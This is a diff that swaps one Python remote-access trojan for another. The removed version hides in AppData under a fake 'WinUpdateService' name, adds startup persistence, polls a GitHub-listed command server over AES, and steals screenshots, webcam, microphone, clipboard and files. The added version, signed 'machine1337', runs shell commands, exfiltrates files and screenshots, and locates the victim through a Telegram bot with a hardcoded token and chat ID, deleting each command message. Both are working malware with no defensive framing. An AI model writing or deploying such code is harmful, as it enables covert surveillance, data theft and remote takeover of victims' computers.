@@ -1,205 +1,184 @@
-import os, io, time, json, base64, random, socket, platform, requests, subprocess, sys
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-import cv2
-import wave
-import pyperclip
-import psutil
-import pyaudio
-from PIL import ImageGrab
-import winreg
-import shutil
+import os
+import platform
+import requests
+import subprocess
+import time
+try:
+    from PIL import ImageGrab
+except ImportError:
+    if platform.system().startswith("Windows"):
+        os.system("python -m pip install pillow -q -q -q")
+        from PIL import ImageGrab
+    elif platform.system().startswith("Linux"):
+        os.system("python3 -m pip install pillow -q -q -q")
+        from PIL import ImageGrab
+
+TOKEN = '8228359655:AAGaiSLzLY5mtVhew7WkkCkQGD3QkpGJ-z0'   #change the token here
+CHAT_ID = '7082810986'   #change the chat id here
+processed_message_ids = []
+def get_updates(offset=None):
+    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
+    params = {'offset': offset, 'timeout': 60}
+    response = requests.get(url, params=params)
+    if response.status_code == 200:
+        data = response.json()
+        return data.get('result', [])
+    else:
+        print(f"Failed to get updates. Status code: {response.status_code}")
+        return []
 
 
-HIDDEN_FOLDER = os.path.join(os.environ["APPDATA"], "WinUpdateService")
-HIDDEN_EXE = os.path.join(HIDDEN_FOLDER, "service.exe")
+def delete_message(message_id):
+    url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
+    params = {'chat_id': CHAT_ID, 'message_id': message_id}
+    response = requests.get(url, params=params)
+    if response.status_code != 200:
+        print(f"Failed to delete message. Status code:")
+#coded by machine1337
+def execute_command(command):
+    if command == 'cd ..':
+        os.chdir('..')
+        return "Changed current directory to: " + os.getcwd()
+    elif command == 'location':
+        response = requests.get('https://ifconfig.me/ip')
+        public_ip = response.text.strip()
 
-GITHUB_URL_SOURCE = "https://raw.githubusercontent.com/gzmox/yerasdus-c5-optuiasfd/refs/heads/main/text.txt"
-ENCRYPTION_KEY = base64.urlsafe_b64decode("BZ8ZVr6LlAGw9DHcW0M8B8ZZb9emBVDlYzmvh0tPOVk=")
-VICTIM_NAME = os.getenv("USERNAME", "unknown")
-
-def encrypt_data(data: bytes) -> str:
-    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
-    ct = cipher.encrypt(pad(data, AES.block_size))
-    return json.dumps({
-        "iv": base64.b64encode(cipher.iv).decode(),
-        "data": base64.b64encode(ct).decode()
-    })
-
-def decrypt_data(payload: str) -> bytes:
-    obj = json.loads(payload)
-    iv = base64.b64decode(obj["iv"])
-    ct = base64.b64decode(obj["data"])
-    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
-    return unpad(cipher.decrypt(ct), AES.block_size)
-
-def install_to_hidden():
-    if not os.path.exists(HIDDEN_FOLDER):
-        os.makedirs(HIDDEN_FOLDER, exist_ok=True)
-
-    if not os.path.exists(HIDDEN_EXE):
-        current_exe = sys.executable
         try:
-            shutil.copy2(current_exe, HIDDEN_EXE)
-            print(f"[+] Copied to hidden folder: {HIDDEN_EXE}")
-            add_to_startup(HIDDEN_EXE)
-            subprocess.call(["attrib", "+h", HIDDEN_FOLDER])
-            if os.path.abspath(current_exe) != os.path.abspath(HIDDEN_EXE):
-                subprocess.Popen(f'cmd /c ping 127.0.0.1 -n 2 >nul & del "{current_exe}"', shell=True)
-            os.startfile(HIDDEN_EXE)
-            sys.exit(0)
+            url = f'http://ip-api.com/json/{public_ip}'
+            response = requests.get(url)
+            data = response.json()
+            country = data.get('country')
+            region = data.get('region')
+            city = data.get('city')
+            lat = data.get('lat')
+            lon = data.get('lon')
+            timezone = data.get('timezone')
+            isp = data.get('isp')
+
+            final = f"IP Address: {public_ip},\nCountry: {country},\nRegion: {region},\nCity: {city},\nLatitude: {lat},\nLongitude: {lon},\nTimezone: {timezone},\nISP: {isp}"
+            return final
         except Exception as e:
-            print(f"[!] Installation failed: {e}")
-
-def add_to_startup(exe_path):
-    try:
-        key = winreg.HKEY_CURRENT_USER
-        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as reg:
-            winreg.SetValueEx(reg, "WinUpdateService", 0, winreg.REG_SZ, exe_path)
-        print("[+] Startup persistence added")
-    except Exception as e:
-        print(f"[!] Failed to add startup entry: {e}")
-
-def send_output(server_url, data):
-    payload = encrypt_data(data)
-    requests.post(f"{server_url}/api/upload/{VICTIM_NAME}", json={"payload": payload})
-
-def handle_command(server_url, cmd):
-    try:
-        if cmd == "__screenshot__":
-            img = ImageGrab.grab()
-            buf = io.BytesIO()
-            img.save(buf, format="PNG")
-            send_output(server_url, buf.getvalue())
-
-        elif cmd == "__webcam__":
-            cam = cv2.VideoCapture(0)
-            if not cam.isOpened():
-                send_output(server_url, b"No camera detected")
-            else:
-                ret, frame = cam.read()
-                cam.release()
-                if ret:
-                    _, img_encoded = cv2.imencode('.png', frame)
-                    send_output(server_url, img_encoded.tobytes())
-                else:
-                    send_output(server_url, b"Failed to capture webcam image")
-
-        elif cmd.startswith("__mic__|"):
-            try:
-                seconds = int(cmd.split("|")[1])
-            except:
-                seconds = 5
-
-            audio = pyaudio.PyAudio()
-            if audio.get_device_count() == 0:
-                send_output(server_url, b"No microphone detected")
-            else:
-                stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100,
-                                    input=True, frames_per_buffer=1024)
-                frames = []
-                for _ in range(0, int(44100 / 1024 * seconds)):
-                    frames.append(stream.read(1024))
-                stream.stop_stream()
-                stream.close()
-                audio.terminate()
-
-                buf = io.BytesIO()
-                wf = wave.open(buf, 'wb')
-                wf.setnchannels(1)
-                wf.setsampwidth(2)
-                wf.setframerate(44100)
-                wf.writeframes(b''.join(frames))
-                wf.close()
-                send_output(server_url, buf.getvalue())
-
-        elif cmd == "__sysinfo__":
-            sysinfo = json.dumps({
-                "platform": platform.platform(),
-                "hostname": socket.gethostname(),
-                "user": os.getenv("USERNAME"),
-                "ip": socket.gethostbyname(socket.gethostname())
-            }, indent=2)
-            send_output(server_url, sysinfo.encode())
-
-        elif cmd == "__clipboard__":
-            send_output(server_url, pyperclip.paste().encode())
-
-        elif cmd == "__ps__":
-            processes = "\n".join([f"{p.info['pid']} - {p.info['name']}" for p in psutil.process_iter(['pid','name'])])
-            send_output(server_url, processes.encode())
-
-        elif cmd.startswith("__kill__|"):
-            pid = int(cmd.split("|")[1])
-            psutil.Process(pid).terminate()
-            send_output(server_url, f"Killed process {pid}".encode())
-
-        elif cmd.startswith("__upload__|"):
-            _, path = cmd.split("|", 1)
-            with open(path, "rb") as f:
-                send_output(server_url, f.read())
-
-        elif cmd.startswith("__download__|"):
-            try:
-                remote_path = cmd.split("|", 1)[1]
-                file_data = requests.get(f"{server_url}/api/filedata/{VICTIM_NAME}").content
-                with open(remote_path, "wb") as f:
-                    f.write(file_data)
-                send_output(server_url, f"File downloaded to {remote_path}".encode())
-            except Exception as e:
-                send_output(server_url, f"Download failed: {e}".encode())
-
-        elif cmd == "__selfdestruct__":
-            send_output(server_url, b"Client self-destructing")
-            exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
-            subprocess.Popen(f'cmd /c ping 127.0.0.1 -n 2 >nul & del "{exe_path}"', shell=True)
-            sys.exit(0)
-
+            return 'Error'
+    elif command == 'info':
+        system_info = {
+            'Platform': platform.platform(),
+            'System': platform.system(),
+            'Node Name': platform.node(),
+            'Release': platform.release(),
+            'Version': platform.version(),
+            'Machine': platform.machine(),
+            'Processor': platform.processor(),
+            'CPU Cores': os.cpu_count(),
+            'Username': os.getlogin(),
+        }
+        info_string = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
+        return info_string
+    elif command == 'screenshot':
+        file_path = "screenshot.png"
+        try:
+            screenshot = ImageGrab.grab()
+            screenshot.save(file_path)
+            print(f"Screenshot saved to {file_path}")
+            send_file(file_path)
+            os.remove(file_path)
+            return "Screenshot sent to Telegram."
+        except Exception as e:
+            return f"Error taking screenshot: {e}"
+    elif command == 'help':
+        return '''
+        HELP MENU: Coded By Machine1337
+CMD Commands        | Execute cmd commands directly in bot
+cd ..               | Change the current directory
+cd foldername       | Change to current folder
+download filename   | Download File From Target
+screenshot          | Capture Screenshot
+info                | Get System Info
+location            | Get Target Location
+get url             | Download File From URL (provide direct link)
+            '''
+    elif command.startswith('download '):
+        filename = command[
+                   9:].strip()
+        if os.path.isfile(filename):
+            send_file(filename)
+            return f"File '{filename}' sent to Telegram."
         else:
-            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-            send_output(server_url, out)
-
-    except Exception as e:
-        send_output(server_url, str(e).encode())
-
-def register(server_url):
-    info = {"os": platform.platform(), "hostname": socket.gethostname()}
-    payload = encrypt_data(json.dumps(info).encode())
-    requests.post(f"{server_url}/api/register/{VICTIM_NAME}", json={"payload": payload})
-
-def poll_commands():
-    server_url = None
-    first_run = True
-    while True:
+            return f"File '{filename}' not found."
+    elif command.startswith('get '):
+        url = command[4:].strip()
         try:
-            new_url = requests.get(GITHUB_URL_SOURCE, timeout=5).text.strip()
-            if new_url and new_url != server_url:
-                server_url = new_url
-                register(server_url)
-
-            if server_url:
-                cmd_payload = requests.get(f"{server_url}/api/cmd/{VICTIM_NAME}", timeout=5).text
-                cmd = decrypt_data(cmd_payload).decode().strip()
-                if cmd:
-                    handle_command(server_url, cmd)
+            download = requests.get(url)
+            if download.status_code == 200:
+                file_name = url.split('/')[-1]
+                with open(file_name, 'wb') as out_file:
+                    out_file.write(download.content)
+                return f"File downloaded and saved as '{file_name}'."
+            else:
+                return f"Failed to download file from URL: {url}. Status Code: {download.status_code}"
         except Exception as e:
-            print(f"[!] Polling error: {e}")
+            return f"Failed to download file from URL: {url}. Error: {str(e)}"
+    elif command.startswith('cd '):
+        foldername = command[3:].strip()
+        try:
+            os.chdir(foldername)
+            return "Directory Changed To: " + os.getcwd()
+        except FileNotFoundError:
+            return f"Directory not found: {foldername}"
+        except Exception as e:
+            return f"Failed to change directory. Error: {str(e)}"
+    else:
+        try:
+            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+            return result.decode('utf-8').strip()  
+        except subprocess.CalledProcessError as e:
+            return f"Command execution failed. Error: {e.output.decode('utf-8').strip()}"
 
-        time.sleep(random.randint(5, 15) if not first_run else random.randint(3, 15))
-        first_run = False
 
-def hide_console():
-    try:
-        import ctypes
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    except:
-        pass
+def send_file(filename):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    with open(filename, 'rb') as file:
+        files = {'document': file}
+        data = {'chat_id': CHAT_ID}
+        response = requests.post(url, data=data, files=files)
+        if response.status_code != 200:
+            print(f"Failed to send file.")
 
-if __name__ == "__main__":
-    hide_console()
-    if not os.path.exists(HIDDEN_EXE):
-        install_to_hidden()
-    print("[+] Client started")
-    poll_commands()
-
+def handle_updates(updates):
+    highest_update_id = 0
+    for update in updates:
+        if 'message' in update and 'text' in update['message']:
+            message_text = update['message']['text']
+            message_id = update['message']['message_id']
+            if message_id in processed_message_ids:
+                continue
+            processed_message_ids.append(message_id)
+            delete_message(message_id)
+            result = execute_command(message_text)
+            if result:
+                send_message(result)
+        update_id = update['update_id']
+        if update_id > highest_update_id:
+            highest_update_id = update_id
+    return highest_update_id
+def send_message(text):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    params = {
+        'chat_id': CHAT_ID,
+        'text': text
+    }
+    response = requests.get(url, params=params)
+    if response.status_code != 200:
+        print(f"Failed to send message.")
+def main():
+    offset = None
+    while True:
+        updates = get_updates(offset)
+        if updates:
+            offset = handle_updates(updates) + 1
+            processed_message_ids.clear()
+        else:
+            print("No updates found.")
+        time.sleep(1)
+if __name__ == '__main__':
+    main()
+#coded by machine1337. Don't copy this code
